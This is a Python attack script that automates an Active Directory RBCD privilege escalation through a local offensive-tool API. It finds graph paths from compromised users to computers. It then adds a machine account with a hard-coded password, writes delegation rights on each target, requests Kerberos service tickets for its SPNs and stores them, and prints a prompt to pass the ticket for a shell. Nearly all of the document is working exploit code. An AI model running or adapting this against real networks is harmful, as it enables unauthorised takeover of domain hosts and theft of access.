import json, argparse
import requests as req
import re
comp_name = f"randomcomputer550"
comp_pass = 'Password123!'

options = argparse.ArgumentParser()


options.add_argument("-d", help="target domain")
options.add_argument('-dc', help="the domain controller hostname")
options.add_argument("-dc_ip", help="domain controller ip")
art =  req.get('http://localhost:9000/').text

print(art) # cool ascii art
args = options.parse_args()
domain = args.d
dc = args.dc
dc_ip = args.dc_ip



class Custom_exception(Exception):
    def __init__(self, message):
        self.message = f"no possible path due to relationship: {message}"
        super().__init__(self.message)

from uuid import uuid4
import random
def run(user, password, hash_, aeskey, delegate_to):
  comp_name = 'randomcomputer550'
  comp_pass = 'Password123!'
  j = {
    "target": {
      "domain": domain,
      "dc": dc,
      "kerberos": "False",
      "ldap_ssl": "False",
      "user_name": user,
      "dc_ip": dc_ip
    },
    "kerb": {
      "password": password,
      "user_hash": hash_,
      "aeskey": aeskey
    },
    "ops": {
      "option": "add_computer",
      "computer_name": comp_name,
      "computer_pass": comp_pass,
      "ou": "",
      "contianer": ""
    }
  }

  response = req.post('http://localhost:9000/ldap/objeditor', json=j).json()
  print(response)

  if "error" in response['response'] and "entryAlreadyExists" not in response['response']:
      raise Custom_exception(message=response['response'])


  j = {
    "target": {
      "domain": domain,
      "dc": dc,
      "kerberos": "False",
      "ldap_ssl": "False",
      "user_name": user,
      "dc_ip": dc_ip
    },
    "kerb": {
      "password": password,
      "user_hash": hash_,
      "aeskey": aeskey
    }
  }





  j = {
    "target": {
      "domain": domain,
      "dc": dc,
      "kerberos": "False",
      "ldap_ssl": "False",
      "user_name": user,
      "dc_ip": dc_ip
    },
    "kerb": {
      "password": password,
      "user_hash": hash_,
      "aeskey": aeskey
    },
    "ops": {
    "option": "add_rbcd",
    "target_obj": delegate_to,
    "service": f"{comp_name}$"
    }
  }

  response = req.post('http://localhost:9000/ldap/objeditor', json=j).json()
  print(response)
  sddl = response['response']['sddl']

  opp = input("rerun collection script (y/n)? ")
  if opp.lower() == "y":
      print("rerunning collection script......")
      req.get('http://localhost:9000/graphing/clear')
      response = req.post('http://localhost:9000/ldap/collect', json=j)
  print(sddl)
  query = f"""
    MATCH (a) WHERE a.name = '{comp_name}$'
    MATCH (c) WHERE c.name = '{delegate_to}'
    MERGE (a)-[b:Rbcd]->(c) 
    set b.sddl = '{sddl}'
    set a.pwned = "True"
    set a.added_comp = "True"
    return a,b,c
    """
  print(f'adding relationship: {comp_name} --> {delegate_to}')
  a = req.post('http://localhost:9000/graphing/query', json={'query': query})

  

  comp_name = comp_name + "$"
  node = req.post('http://localhost:9000/graphing/query', json={'query': f"MATCH (a) WHERE a.name = '{delegate_to}' RETURN a"}).json()
  spns = []
  for n in list(node[0]['a'].keys()):
    if 'servicePrincipalName' in n:
      spns.append(node[0]['a'][n])
  spns.append(f'cifs/{delegate_to}')
  for spn in spns:
    j = {
      "target": {
      "domain": domain,
      "dc": dc,
      "kerberos": "False",
      "ldap_ssl": "False",
      "user_name": comp_name,
      "dc_ip": dc_ip
    },
    "kerb": {
      "password": comp_pass,
      "user_hash": hash_,
      "aeskey": aeskey
    },
    "roast": {
      "target_user": delegate_to,
      "no_preauth": "False"
    },
    "st_data": {
      "spn": f"{spn}",
      "u2u": "",
      "no_s4u2proxy": ""
    }
  }
    response = req.post('http://localhost:9000/kerberos/st', json=j).json()
    if "error:" in response['ST']:
      j = {
        "target": {
        "domain": domain,
        "dc": dc,
        "kerberos": "False",
        "ldap_ssl": "False",
        "user_name": comp_name,
        "dc_ip": dc_ip
      },
      "kerb": {
        "password": comp_pass,
        "user_hash": hash_,
        "aeskey": aeskey
      },
      "roast": {
        "target_user": delegate_to,
        "no_preauth": "False"
      },
      "st_data": {
        "spn": f"{spn}",
        "u2u": "true",
        "no_s4u2proxy": ""
      }
    }
      response = req.post('http://localhost:9000/kerberos/st', json=j).json()
    if "error:" in response['ST']:
      j = {
        "target": {
        "domain": domain,
        "dc": dc,
        "kerberos": "False",
        "ldap_ssl": "False",
        "user_name": comp_name,
        "dc_ip": dc_ip
      },
      "kerb": {
        "password": comp_pass,
        "user_hash": hash_,
        "aeskey": aeskey
      },
      "roast": {
        "target_user": delegate_to,
        "no_preauth": "False"
      },
      "st_data": {
        "spn": f"{spn}",
        "u2u": "",
        "no_s4u2proxy": "true"
      }
    }
      response = req.post('http://localhost:9000/kerberos/st', json=j).json()
    if "error:" not in response['ST']:
      print(f"ticket with {spn}: {response['ST']}")
      print('running post exploitation............')
      query = f"""
      MATCH (a)-[b:Rbcd]-(c) WHERE a.name = '{comp_name}' and c.name = '{delegate_to}'
      set b.ticket = '{response['ST']}'
      """
      a = req.post('http://localhost:9000/graphing/query', json={'query': query})
      print(f"use a pass the ticket attack to get a shell on {delegate_to}")
    else:
      print(f"error: {response['ST']}")

query = """
MATCH path1=(n {t: "user"})-[ *ALLSHORTEST (r, n | 1)]->(m)
WHERE m.disabled IS NULL AND m.t = "computer"
  AND n.disabled IS NULL 
  AND n.pwned = "True" 
  AND m.pwned IS NULL 
  AND m.added_comp IS NULL 
  AND NOT m.name = 'randomcomputer550$'
  AND ALL(rel IN relationships(path1) WHERE type(rel) IN ["memberOf", "GENERIC_ALL"])
  AND size(relationships(path1)) > 0

RETURN path1
""" # find possible attack paths

import json
import re
import ast

attack = []

j = {'query': query}
response = req.post('http://localhost:9000/graphing/query', json=j).text
response = json.loads(response)

for path in response:
    user = None
    delegates = []

    for node in path['path1']:
        if type(node) != type('a'):
        #node = {x.split(':')[0]: x.split(':')[1] for x in node.split(',')}
          if node['t'] == 'user':
              user = node['name']
          elif node['t'] == 'computer':
              name = node['name'] 
              delegates.append(name)

    if user:
        attack.append({user: delegates})
        
print(attack)
# for rs in response:
#     rs = rs['path1']
#     for r in rs:
#         if type(r) != str('a'):
#             try:
#                 if r['pwned'] == "True" and r['domain'] == domain:
#                     user = r['name']
#                     break
#             except:
#                 None
    
#     delegate_to = rs[-1]['name']


for user_data in attack:
  user = list(user_data.keys())[0]
  print(f'using user: {user}')
  password = ""
  hash_ = ":"
  aeskey = ""
  opp = input("hash, password, or AESKey? ")
  if opp == "password":
          password = input(f'enter password for {user}: ')
          attr = password
  if opp == "AESKey":
          aeskey = input(f'enter AESKey for {user}: ')
          attr = aeskey
  if opp == "hash":
          hash_ = input(f'enter hash for in (lm:nt) format {user}: ')
          attr = hash_

  query = f"""
  MATCH (a) WHERE a.name = '{user}' set a.{opp} = '{attr}' return a
  """
  response = req.post('http://localhost:9000/graphing/query', json={'query': query})
  for delegate_to in user_data[user]:
    run(user, password, hash_, aeskey, delegate_to)


